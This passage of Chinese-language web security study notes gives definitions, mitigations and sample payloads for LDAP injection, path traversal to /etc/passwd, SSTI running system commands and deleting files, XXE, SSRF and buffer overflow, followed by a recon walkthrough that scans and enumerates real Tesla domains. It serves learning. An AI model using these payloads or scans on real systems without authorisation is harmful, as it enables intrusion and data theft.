LDAP查询以执行所需操作</p></blockquote><ol type="1"><li>简单匹配: <code>(username=&#123;name&#125;)</code></li><li><strong>析取查询</strong>:<code>(|(username=&#123;name&#125;), (1=1))</code></li><li><strong>合取查询</strong>:<code>(&amp; (username=&#123;name&#125;), (password=&#123;pwd&#125;))</code></li></ol><blockquote><p>相比SQL, 由于 LDAP 要求符号 <code>&amp;</code>, <code>|</code>写在最前面, 那么在所以<code>or 1=1</code>这种注入比较难实现</p></blockquote><p><strong>Exploit</strong></p><ol type="1"><li>通配符: <code>(usernmae=*))</code>, 看似合取查询, 实则通配符查询，然后用<code>)</code>截断</li><li>利用LDAP解析问题, 构造多个匹配<ol type="1"><li>正常语句为:<code>(&amp; (username=&#123;name&#125;) (password=&#123;pwd&#125;) )</code></li><li>构造语句为: <code>(&amp; (username = &#123;*&#125;)</code> <code>)</code><code>(| (username = &#123;name&#125;) (password=&#123;pwd&#125;) )</code></li><li>通过 <code>)</code> 先闭合一个似合取查询的通配符查询,</li></ol></li></ol><h2 id="lfi">LFI</h2><p><strong>定义</strong></p><blockquote><p><strong>Local File Inclusion 本地⽂件包含 (LFI)</strong></p></blockquote><h2 id="directory-traversal">Directory Traversal</h2><p><strong>定义</strong></p><blockquote><p><strong>Directory Traversal Attack 目录遍历攻击</strong></p></blockquote><p><strong>Exploit</strong></p><p><code>/../../etc/passwd</code></p><h2 id="php-protocol">PHP Protocol</h2><p><strong>Exploit</strong></p><p><code>/&#123;dynamic_url&#125;?&#123;params&#125;=php://filter/read=convert.base64-encode/resource=&#123;target php file&#125;</code></p><h2 id="rfi">RFI</h2><p><strong>定义</strong></p><blockquote><p><strong>Remote File Inclusion 远程⽂件包含(RFI)</strong>: 与 LFl相同, 导致相同的漏洞, 使用相同的协议, 但现在可远程获取</p></blockquote><h2 id="filter-bypass">Filter Bypass</h2><p><strong>定义</strong></p><blockquote><p><strong>Filter Bypass 过滤绕过</strong>:过滤器可以使用正则表达式或任何类型的字符串匹配</p></blockquote><p><strong>Exploit</strong></p><p><strong>XSS 绕过<code>&lt;/&gt;</code>过滤的方法:</strong></p><ol type="1"><li><code>&lt;</code> = <code>\u003c</code> = <code>\x3c</code> =<code>&amp;lt</code> = <code>&amp;#60</code></li><li><code>/</code> = <code>\u002f</code> = <code>\x2f</code> =<code>&amp;sol</code> = <code>&amp;#47</code></li><li><code>&gt;</code> = <code>\u003e</code> = <code>\x3e</code> =<code>&amp;gt</code> = <code>&amp;#62</code></li></ol><h2 id="code-injection">Code injection</h2><p><strong>定义</strong></p><blockquote><p><strong>Code injection 代码注入</strong>: 这种攻击可能是盲目的,永远记得尝试引入时间延迟（睡眠）或外部服务器交互</p></blockquote><h2 id="log-injection">Log injection</h2><p><strong>定义</strong></p><blockquote><p><strong>Log injection ⽇志注⼊</strong></p></blockquote><p><strong>Mitigation</strong></p><p>不要向用户公开日志。他们不应该看到他们。在将用户输入存储在日志中之前,请先对其进行清理。不允许用户控制日志的路径/文件名</p><h2 id="command-injection">Command injection</h2><p><strong>定义</strong></p><blockquote><p><strong>OS Command injection 操作系统命令注⼊</strong>:没有正确清理用户输入。将操作系统命令注入为用户输入</p></blockquote><p><strong>Mitigation</strong></p><ol type="1"><li>针对允许值的白名单进行验证。</li><li>验证输入是否为数字（如果输入是预期的数字）。</li><li>验证输入是否仅包含字母数字字符, 而不包含其他字符语法或空格。</li><li>不允许用户输入到达操作系统命令！你是在找麻烦,重新架构该软件要避免这种情况！</li></ol><h2 id="buffer-overflow">Buffer Overflow</h2><p><strong>Low-level memory 低级内存</strong></p><ul><li>CPU架构<ul><li>包含 CPU 注册器</li><li>16 个通用寄存器, 用于 64 位 （x86-64）</li><li>8 个通用寄存器, 用于 32 位（x86）</li><li>Cache Stores 缓存: 将信息存储一定时间<ul><li>随着金字塔的下行, 存储变得越来越便宜和缓慢。</li></ul></li><li>Elastic Instruction Pointer (EIP): 弹性指令指针</li><li>Elastic Base Pointer (EBP): 弹性基础指针</li><li>Elastic Stack Pointer (ESP): 弹性堆栈指针</li><li>Endianness: 字节序</li></ul></li></ul><p><strong>定义</strong></p><blockquote><p>过度填充缓冲区, 直到覆盖内存位置, 从而导致应用程序流发生更改。通常,我们尝试接管ERIP, 因为它使我们能够控制程序执行流。</p></blockquote><p><strong>Exploit</strong></p><ol type="1"><li><code>C</code> code with Stack Overflow Vulnerability</li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FLAGSIZE_MAX 64</span></span><br><span class="line"><span class="keyword">char</span> flag[FLAGSIZE_MAX];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigsegv_handler</span> <span class="params">(<span class="keyword">int</span> sig)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;%s\n&quot;</span>, flag);</span><br><span class="line">    fflush(<span class="built_in">stderr</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">(<span class="keyword">char</span> *input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(buf, input) ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">FILE *f = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (f == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this program.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">fgets(flag,FLAGSIZE_MAX,f);</span><br><span class="line">signal(SIGSEGV, sigsegv_handler);</span><br><span class="line"><span class="keyword">gid_t</span> gid = getegid();</span><br><span class="line">setresgid(gid, gid, gid);</span><br><span class="line"><span class="keyword">if</span> (argc &gt; <span class="number">1</span>) &#123;</span><br><span class="line">    vuln(argv[<span class="number">1</span>]);</span><br><span class="line">    print (<span class="string">&quot;Thanks! Received: %s\n&quot;</span>, argv[<span class="number">1</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">    print(<span class="string">&quot;This program takes 1 argument.\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2" type="1"><li><p>Execute will found Problem</p><ul><li><p><code>gcc -fno-stack-protector vuln.c -o vuln</code></p></li><li><p align="center"><p><img src=https://fastly.jsdelivr.net/gh/ZhidongZhou/gallery@master/img/lec5demo1bufferoverflow.png alt="blockw" style="zoom:30%;"/></p></p></li></ul></li></ol><h2 id="timing-attack">Timing Attack</h2><blockquote><p>Timing Attack 响应时间攻击: 是受过教育的基于蛮⼒的攻击, 类似于SQLi.根据服务器对请求的响应时间推断正确的输入值。</p></blockquote><p><strong>Exploit</strong></p><ol type="1"><li>通过 <strong>brute-force 蛮力法</strong>破解密码</li><li>使用 Burp-suite intercept 接获尝试登录密码的请求</li><li>通过 Burp-suite intruder, 重放讲密码的第1位设置为变量</li><li>然后导入 Character Set: <code>&#123;a-z, A-Z, 0-9&#125;</code></li><li>根据从<u>Server 服务器</u>, <strong>Response Received收到回复</strong> 的时间判断哪一个 <strong>character 字符</strong>是正确的</li><li>然后依次类推到第2位, 第三位。</li></ol><p>用Python 记录请求时间:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> multiprocessing <span class="keyword">as</span> mp</span><br><span class="line"></span><br><span class="line">usernames = [<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;user1&quot;</span>, <span class="string">&quot;...&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login_time</span>(<span class="params">username</span>):</span></span><br><span class="line">    url = <span class="string">&quot;&#123;URL&#125;&quot;</span></span><br><span class="line">    data = &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password&quot;</span>: pwd&#125;</span><br><span class="line">    start = time.time()</span><br><span class="line">    requests.post(url, data)</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="built_in">print</span>(username, <span class="string">&quot;&quot;</span> <span class="keyword">if</span> end - start &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="string">&quot;username not exists&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> end - start</span><br><span class="line"></span><br><span class="line">pool = mp.Pool()</span><br><span class="line">pool.<span class="built_in">map</span>(login_time, usernames)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="format-string-attack">Format String Attack</h2><p><strong>定义</strong></p><blockquote><p>利用语言提供的打印命令, 使开发人员更容易打印,允许开发人员指定变量的数据类型和位置,在打印字符串中,开发人员可以使用它来打印字符串、整数、内存位置等。</p></blockquote><p><strong>Exploit</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">strncpy</span>(buffer, argv[<span class="number">1</span>], <span class="number">100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buffer);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Impact</strong></p><ol type="1"><li>DOS 泛红攻击</li><li>Information leakage</li></ol><p><strong>Mitigation</strong></p><ol type="1"><li>切勿让用户控制能够设置格式的打印语句</li><li>如果可以, 则默认为 <code>%s</code></li><li><strong>清理 Sanitise</strong> 用户输入: <code>%</code></li></ol><h2 id="ssit">SSIT</h2><p><strong>定义</strong></p><blockquote><p><ahref="https://portswigger.net/web-security/server-side-template-injection">Server-SideTemplate Injection (SSIT)</a> 服务器端模板注⼊</p></blockquote><p><strong>Template engine: <code>Jinja2</code></strong></p><p><strong>Exploit</strong></p><blockquote><p>需要 URL Encoding</p></blockquote><ol type="1"><li>运算: <code>&#123;dynamic_url&#125;?&#123;param&#125;=&lt;%= 7*7 %&gt;</code></li><li>系统命令:<code>&#123;dynamic_url&#125;?&#123;param&#125;=&lt;%= system('id') %&gt;</code></li><li>删除: <code>&lt;%= system('rm &#123;target_file&#125;') %&gt;</code></li></ol><blockquote><p>并且不同Framwork有不同的语法:</p></blockquote><ol type="1"><li><p><ahref="https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context">TOMADO</a></p><ol type="1"><li>执行任意 Python: <code>&#123;% somePython %&#125;</code></li><li>删除: <code>&#123;%import os%&#125;&#123;&#123;os.system('rm /home/carlos/morale.txt')`2. Django   1. `&#123;% debug %&#125;`   2. `&#123;&#123;settings.SECRET_KEY&#125;&#125;</code></li></ol></li></ol><p><strong>Mitigation</strong></p><ol type="1"><li>不允许用户直接在模板中输入信息</li><li>始终对用户输入进行<strong>清理 Sanitise</strong></li><li>使用 WAF</li></ol><h2 id="http-parameter-pollution">HTTP Parameter Pollution</h2><p><strong>定义</strong></p><blockquote><p><strong>HTTP Parameter Pollution 参数污染</strong>:导致应用程序误解提供的参数, 可以使用它绕过输入验证</p></blockquote><h2 id="http-splittingsmuggling">HTTP Splitting/Smuggling</h2><p><strong>定义</strong></p><blockquote><p><strong>HTTP Splitting/Smuggling 拆分</strong>:它基本上是使用攻击者的输入恶意地从服务器拆分响应。通常发现于未经消毒的用户输入中,反映在响应中</p></blockquote><p><strong>Carriage Return Line Feed (CRLF)</strong></p><ol type="1"><li>回车线路馈送</li><li>字符: <code>\r</code>, <code>\n</code></li><li>URL encoded: <code>%0d</code>, <code>%0a</code></li><li>用于终止线路</li><li>可恶意用于拆分响应</li></ol><p><strong>Mitigation</strong></p><ol type="1"><li>清理用户输入</li><li>筛选用户输入以忽略 <code>\r</code>, <code>\n</code> 和<code>%0d</code>, <code>%0a</code></li><li>使用 WAF</li></ol><h2 id="http-desynchronisation-attacks">HTTP DesynchronisationAttacks</h2><p><strong>定义</strong></p><blockquote><p><strong>HTTP去同步攻击</strong>: 前端和后端服务器之间的不同步,与某种代理或缓存服务器相关, 类似于缓冲区溢出</p></blockquote><p><strong>Mitigation</strong></p><ol type="1"><li>如果您没有 CDN、反向代理或负载均衡器, 则不会受到攻击。</li><li>将前端配置为独占使用 HTTP/2</li><li>根据有效负载大小检查内容长度标头值</li></ol><h2 id="web-cache-deception">Web Cache Deception</h2><p><strong>定义</strong></p><blockquote><p><strong>Web Cache Deception 网络缓存欺骗</strong></p></blockquote><h2 id="xxe">XXE</h2><p><strong>定义</strong></p><blockquote><p><strong>XML eXternal Entities (XXE) XML 的外部实体</strong>:利用应用程序处理 XML 信息。</p><p>文档类型定义: 定义 XML 文档的结构, 不同类型的 XML文档将使用不同的<strong>DTD</strong>。</p><p>例如: XHTML严格使用不同的<strong>DTO</strong>到XHTML过渡</p></blockquote><h2 id="billion-laughs">Billion Laughs</h2><p><strong>定义</strong></p><blockquote><p>以递归方式引用实体, 消耗服务器资源</p></blockquote><p><strong>Exploit</strong></p><ol type="1"><li>定义一个实体（如 CDATA lol）</li><li>定义更多多次引用前一个实体的实体</li><li>使用的实体级别越多, 漏洞利用就越有效</li></ol><p><strong>Impact</strong></p><ol type="1"><li>此漏洞以指数级增长</li></ol><p><strong>Mitigation</strong></p><ol type="1"><li>限制允许处理的递归实体的数量</li><li>配置分析器以安全地处理 XML 实体</li><li>仅处理受信任的 DTD 文件</li><li>不处理内联实体</li><li>限制解析器和应用程序可用的内存量:这可确保对一个应用程序的拒绝服务不会影响不是同一服务器的其他应用程序（或同一应用程序的其他部分）</li></ol><p><ahref="https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf"><strong>通过XEE实现SSRF</strong></a></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf</span></span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY attack SYSTEM <span class="string">&quot;http://locahost/&#123;path&#125;&quot;</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line"><span class="comment">// XXL need reference back to the name: attack, and must end with the &#x27;;&#x27; delimiter.</span></span><br><span class="line">&amp;attack;</span><br></pre></td></tr></table></figure><p><img src="https://fastly.jsdelivr.net/gh/ZhidongZhou/gallery@master/img/202204291543576.png" alt="iShot2022-04-29 15.40.44" style="zoom:50%;" /></p><h2 id="ssrf"><ahref="https://portswigger.net/web-security/ssrf">SSRF</a></h2><p><strong>定义</strong></p><blockquote><p><strong>Server-Side Request Forgery (SSRF) 服务器端请求伪造</strong>:欺骗<u>服务器</u>代表攻击者执行未经授权的请求</p><p>通常需要:</p><ol type="1"><li><strong>Dynamic URL 动态地址</strong> (e.g.<code>auth.php</code>)</li><li><strong>Vulnerable Parameter 漏洞参数</strong> (e.g.<code>web</code>)</li></ol><p>这样通过 <code>auth.php?web=&#123;url&#125;</code> 可以实现 SSRF</p></blockquote><p><strong>Exploit</strong></p><ol type="1"><li>伪造请求到 External URL:<code>index.php?web=&#123;https://www.google.com&#125;</code></li><li>伪造请求到 Internal URL:<code>index.php?web=&#123;http://localhost:1234/&#125;</code><ul><li>需要进行 <strong>port scanning 端口扫描</strong>, 找到开放端口:<code>index.php?web=&#123;http://localhost:$1234$/&#125;</code></li><li>逐步尝试获取开放端口下的内容: e.g.<code>index.php?web=&#123;http://localhost:$1234$/admin&#125;</code></li></ul></li></ol><h2 id="data-exfiltration">Data Exfiltration</h2><p><strong>定义</strong></p><blockquote><p><strong>Data Exfiltration 数据泄露</strong>: 从服务器窃取数据,可以通过多种方式完成: 包括通过HTTP, DNS, 甚至通过访问特定页面！可以帮助窃取密码文件, 配置文件和各种敏感信息。</p></blockquote><p><strong>根据泄漏的Dynamic URL &amp;Parameter发起伪造服务端请求</strong></p><p><strong>Exploit</strong></p><ol type="1"><li>External:<code>http://&#123;target_domain&#125;/&#123;dynamic_url&#125;?&#123;param&#125;=&#123;external_website&#125;</code></li><li>Internal:<code>http://&#123;target_domain&#125;/&#123;dynamic_url&#125;?&#123;param&#125;=http://localhost:&#123;vulnerable_port&#125;/path/file.txt</code></li></ol><h2 id="rce">RCE</h2><p><strong>定义</strong></p><blockquote><p><strong>Remote Code Execution (RCE) 远程执行代码</strong></p></blockquote><ol type="1"><li>尝试使用 <code>expect://</code><ol type="1"><li>这是一个需要显式启用的包装器, 例如: <code>expect://ls</code></li></ol></li><li>还可以使用其他协议来发挥您的优势, 例如: <code>gopher:</code></li></ol><h2 id="authorisation-vs-authentication">Authorisation vsAuthentication</h2><h2 id="serialisation-vs-deserialisation">Serialisation vsDeserialisation</h2><p><strong>Serialisation</strong>: Marshalling,<code>Data Structure =&gt; String/Buffer</code><strong>Deserialisation</strong>: Unmarshalling,<code>String/Buffer =&gt; Data Structure</code></p><h2 id="idor">IDOR</h2><p><strong>定义</strong>:</p><blockquote><p><strong>Insecure Direct Object References (IDOR)不安全的直接对象引⽤</strong>:</p></blockquote><p><strong>Impact</strong>: &gt; 导致越权访问,并且该攻击容易通过自动化实现。</p><p><strong>Exploit</strong>:</p><blockquote><p>案例1: 通常在线聊天机器人, 存在类似漏洞,网站通常强制用户下载整个聊天记录 <code>*.txt</code></p><p>同样的我们可以通过更改请求中聊天记录的名字去访问他人的聊天记录。</p><p>案例2: 用户登录功能可能包含一个不安全的 Parameter 参数,我们可以通过更改参数对应的 Value 输入值去访问他人的信息。</p></blockquote><p><strong>Mitigation</strong>:</p><blockquote><p>很显然没有权限的人不应该能够访问他人的信息,通过修改代码逻辑确保在检索对象信息之前正确的执行<u>权限检查</u>。</p></blockquote><h2 id="recon">Recon</h2><blockquote><p><strong>Autonomous System Number (ASN) 自制系统编号</strong>:一个或多个Org机构实体管辖下的所有IP网络和路由器的全体,ISP必须具有一个公开且正式登记的自治系统编号(ASN)</p><p>首先我们可以通过一些工具侦查<strong>ASN</strong>,找到同一机构的一系列IP地址以及对应的ASN</p></blockquote><p>1.whois</p><p>1.1.Find ASNs by specific Domain:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 调用 https://whois.cymru.com/ 的API</span></span><br><span class="line"><span class="comment"># 用 $(dig +) 深入挖掘指定域名</span></span><br><span class="line">whois -h whois.cymru.com $(dig +short tesla.com)</span><br></pre></td></tr></table></figure><p>1.1.Result:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">AS      | IP               | AS Name</span><br><span class="line">16625   | 23.201.26.71     | AKAMAI-AS, US</span><br><span class="line">AS      | IP               | AS Name</span><br><span class="line">16625   | 104.86.104.55    | AKAMAI-AS, US</span><br><span class="line">AS      | IP               | AS Name</span><br><span class="line">16625   | 184.30.18.203    | AKAMAI-AS, US</span><br><span class="line">AS      | IP               | AS Name</span><br><span class="line">20940   | 2.20.92.122      | AKAMAI-ASN1, NL</span><br><span class="line">AS      | IP               | AS Name</span><br><span class="line">16625   | 104.89.119.127   | AKAMAI-AS, US</span><br><span class="line">AS      | IP               | AS Name</span><br><span class="line">16625   | 184.50.204.169   | AKAMAI-AS, US</span><br></pre></td></tr></table></figure><p>2.amass:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># install amass</span></span><br><span class="line">brew tap caffix/amass</span><br><span class="line">brew install amass</span><br></pre></td></tr></table></figure><p>更多amass用法查看 <ahref="https://github.com/OWASP/Amass/blob/master/doc/user_guide.md">OWASPAmass User Guide</a></p><p>2.1.按照organization机构名查找隶属ASN</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># intel 子命令可以帮助您发现与您正在调查的org相关联的其他根域名 (通过域名逆向获得结果)。</span></span><br><span class="line">amass intel -org Tesla</span><br></pre></td></tr></table></figure><p>2.1.Result:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ASN: 394161 - AS394161 - TESLA MOTORS, INC.</span><br><span class="line">8.21.14.0/24</span><br><span class="line">8.45.124.0/24</span><br><span class="line">8.47.24.0/24</span><br><span class="line">8.244.67.0/24</span><br><span class="line">8.244.131.0/24</span><br><span class="line">62.67.197.0/24</span><br><span class="line">199.66.9.0/24</span><br><span class="line">199.120.48.0/22</span><br><span class="line">199.120.56.0/24</span><br><span class="line">205.234.11.0/24</span><br><span class="line">209.133.79.0/24</span><br><span class="line">213.19.141.0/24</span><br><span class="line">213.244.145.0/24</span><br><span class="line">2620:137:d000:1::/64</span><br><span class="line">199.43.255.0/24</span><br><span class="line">199.66.10.0/24</span><br><span class="line">199.66.11.0/24</span><br><span class="line">199.120.48.0/24</span><br><span class="line">199.120.49.0/24</span><br><span class="line">199.120.50.0/24</span><br><span class="line">199.120.51.0/24</span><br><span class="line">199.120.52.0/24</span><br><span class="line">199.120.53.0/24</span><br><span class="line">2620:137:d000::/40</span><br><span class="line">192.95.64.0/24</span><br><span class="line">199.66.8.0/22</span><br></pre></td></tr></table></figure><p>2.2.通过ASN找到子域名</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">amass intel -asn 394161</span><br></pre></td></tr></table></figure><p>2.2.Result</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zip.zayo.com</span><br></pre></td></tr></table></figure><p>3.<a href="https://whois.arin.net/ui/">ARIN</a></p><p>3.1.直接通过搜索找到ASN</p><p>3.1.Result</p><p><img src="https://fastly.jsdelivr.net/gh/ZhidongZhou/gallery@master/img/202205191820005.png" alt="iShot2022-05-19 18.20.43" style="zoom:33%;" /></p><p>3.2.Subdomain Enumeration 子域枚举工具最基本的使用</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">amass enum -d teslamotors.com</span><br></pre></td></tr></table></figure><p>3.2.Result</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sdlcvpn.teslamotors.com 209.10.208.55</span><br><span class="line">mobility.teslamotors.com 209.10.208.54</span><br><span class="line">wd-stg-warptmsapiserver.teslamotors.com 199.66.9.82</span><br><span class="line">euvpn.teslamotors.com 213.244.145.215</span><br><span class="line">jss-retail.teslamotors.com 209.133.79.106</span><br><span class="line">... </span><br><span class="line"></span><br><span class="line"><span class="comment"># ... 省略</span></span><br><span class="line"><span class="comment"># 使用 -ip 会包括所有子域名指向的域名</span></span><br><span class="line"><span class="comment"># 通过api找到的子域名有82个</span></span><br><span class="line"><span class="comment"># 通过cert (SSL Certificate) 找到的子域名有41个</span></span><br><span class="line"><span class="comment"># 通过dns Burte Forcing 找到的子域名有1个</span></span><br><span class="line"><span class="comment"># 通过scrape挖掘奇怪的网站找到的子域名有39个</span></span><br><span class="line"><span class="comment"># 通过archive档案找到的子域名有1个</span></span><br><span class="line"><span class="comment"># 通过crawl网站爬取找到的子域名有4个</span></span><br><span class="line">OWASP Amass v3.19.2                               https://github.com/OWASP/Amass</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">168 names discovered - api: 82, cert: 41, dns: 1, scrape: 39, archive: 1, crawl: 4</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">ASN: 15224 - OMNITURE - Adobe Systems Inc.</span><br><span class="line">192.28.144.0/20   1    Subdomain Name(s)</span><br><span class="line">ASN: 49 - ICST-AS - National Bureau of Standards</span><br><span class="line">132.163.96.0/23   1    Subdomain Name(s)</span><br><span class="line">2610:20:6f96::/47 1    Subdomain Name(s)</span><br><span class="line">ASN: 40913 - QTS-SJC1 - Quality Technology Services Santa Clara, LLC</span><br><span class="line">209.11.128.0/19   17   Subdomain Name(s)</span><br><span class="line">205.234.24.0/21   8    Subdomain Name(s)</span><br><span class="line">209.10.208.0/20   4    Subdomain Name(s)</span><br><span class="line">209.11.133.96/27  1    Subdomain Name(s)</span><br><span class="line">ASN: 0 - Reserved Network Address Blocks</span><br><span class="line">192.168.0.0/16    1    Subdomain Name(s)</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">The enumeration has finished</span><br><span class="line">Discoveries are being migrated into the <span class="built_in">local</span> database</span><br></pre></td></tr></table></figure><p>4.<ahref="https://apps.db.ripe.net/db-web-ui/#/fulltextsearch">RIPE</a></p><p>4.1.更详细的ASN信息</p><p>4.1.Result</p><p>https://apps.db.ripe.net/db-web-ui/#/query?bflag=false&amp;dflag=false&amp;rflage=true&amp;searchtext=tesla&amp;source=RIPE</p><p>5.<a href="https://www.shodan.io/">Shodan</a></p><p>5.1.根据org查找ASN</p><p>5.1.Result</p><p>https://www.shodan.io/search?query=org%3A%22Tesla%22</p><blockquote><p>其次我们可以用top-level domain (TLD) Discovery 顶级域名探索(类似通过企查查找信息)</p><p>例如:</p><ol type="1"><li><ahref="https://en.wikipedia.org/wiki/Tesla,_Inc.">Wikipedia</a></li><li><ahref="https://www.crunchbase.com/organization/tesla-motors#section-acquisitions">Crunchbase</a></li><li><a href="https://www.owler.com/company/tesla">Owler</a></li><li><ahref="https://acquiredby.co/?s=tesla&amp;submit=Search">Acquiredby</a></li><li><ahref="https://www.linkedin.com/company/tesla-motors/">Linkedin</a>【需要登陆】</li><li>ReverseWhois with amass:<code>amass intel -d tesla.com -whois</code></li><li><a href="https://builtwith.com/tesla">BuiltWith</a></li><li>Google Dorks: <code>intext:"Copyright (c) tesla motors"</code></li><li><ahref="https://www.shodan.io/search?query=Http.favicon.hash%3A1179099333">ShodanDorks</a>:<code>Http.favicon.hash:1179099333</code>【支持根据网站图标搜索, e.g.YouTube】<ul><li><a href="https://faviconhash.com/">Favicon Hash</a></li></ul></li></ol></blockquote><p>6.subfinder</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># install subfinder</span></span><br><span class="line">brew install subfinder</span><br></pre></td></tr></table></figure><p>6.1.通过域名找到子域名</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">subfinder -d teslamotors.com -silent</span><br></pre></td></tr></table></figure><p>6.1.Result</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 结果与 amass enum -d teslamotors.com 类似, 但只显示子域名</span></span><br><span class="line">tel.vn.teslamotors.com</span><br><span class="line">securelogin.teslamotors.com</span><br><span class="line">ec.teslamotors.com</span><br><span class="line">new-origin.teslamotors.com</span><br><span class="line">tesla-account-app-prd.teslamotors.com</span><br><span class="line">channel.dev.teslamotors.com</span><br><span class="line">... </span><br></pre></td></tr></table></figure><p>7.DNS Brute Forcing</p><blockquote><p>基于<a href="https://wordlists.assetnote.io/">AssetnoteWordlists</a>的wordlists.txt列表</p><p>以及<ahref="https://opendata.rapid7.com/sonar.fdns_v2/">rapid7</a>的ForwardDNS</p><p>以及<ahref="https://certstream.calidog.io/">certstream</a>的certificateTransparency: <code>pip install certstream</code></p><p>使用 <a href="https://github.com/infosec-au/altdns">altdns</a>:</p><ul><li><code>git clone https://github.com/infosec-au/altdns</code></li><li><code>pip3 install -r requirements.txt</code></li><li><code>python3 altdns -i ~/pentest/tesla_subdomain.txt -o tmp -w ~/pentest/wordlists.txt -r -s ~/Desktop/altdns_result.txt -t 4</code><ul><li><code>-r</code> : 解析每个生成的、置换的子域</li><li><code>-t</code>: 限制解析器将并行使用的线程</li><li><code>-s</code>: 保存</li></ul></li></ul><p>类似的工具:</p><ul><li><a href="https://github.com/blechschmidt/massdns">massdns</a>:<ul><li><code>brew install massdns</code></li><li><code>massdns -r ~/pentest/dns_resolvers.txt -t AAAA ~/pentest/tesla_subdomain.txt &gt; ~/Desktop/massdns_results.txt</code></li></ul></li><li><a href="https://github.com/OJ/gobuster">gobuster3</a>:<ul><li><code>brew install gobuster</code></li><li><code>gobuster dns -d teslamotors.com -w ~/pentest/wordlists.txt</code></li></ul></li><li><a href="https://github.com/d3mondev/puredns">puredns</a><ul><li><code>git clone https://github.com/d3mondev/puredns.git</code></li><li><code>./puredns bruteforce ~/pentest/wordlists.txt teslamotors.com -r ~/pentest/dns_resolvers.txt</code></li></ul></li></ul></blockquote><p>8.Fingerprinting</p><blockquote><p>识别网站使用的技术栈</p></blockquote><p>8.1.<a href="https://builtwith.com/tesla">BuiltWith</a></p><p>8.2.<ahref="https://www.wappalyzer.com/lookup/teslamotors.com">Wappalyzer</a>【查询网站技术栈的网站】</p><p>8.3.<ahref="https://github.com/urbanadventurer/WhatWeb">WhatWeb</a></p><ul><li><code>./whatweb tesla.com</code></li></ul><p>8.4.<ahref="https://github.com/robertdavidgraham/masscan">masscan</a></p><ul><li><code>masscan -p1-65535 $(dig +short tesla.com) --rate 10000</code></li></ul><p>8.5.<a href="https://nmap.org/">nmap</a></p><ul><li><code>nmap -sV -p 80 yumtaro.com</code></li></ul><p>8.6.<ahref="https://github.com/michenriksen/aquatone/releases/tag/v1.7.0">Aquatone</a></p><ul><li><code>cat ~/pentest/tesla_subdomain.txt | ./aquatone --chrome-path /Applications/Google\ Chrome.app</code></li></ul><p>9.Parameter Discovery</p><p>9.1.<a href="https://github.com/maK-/parameth">parameth</a></p><p>10.Directory Discovery</p><p>10.1.<ahref="https://gitlab.com/kalilinux/packages/dirbuster">DirBuster</a></p><ul><li><a 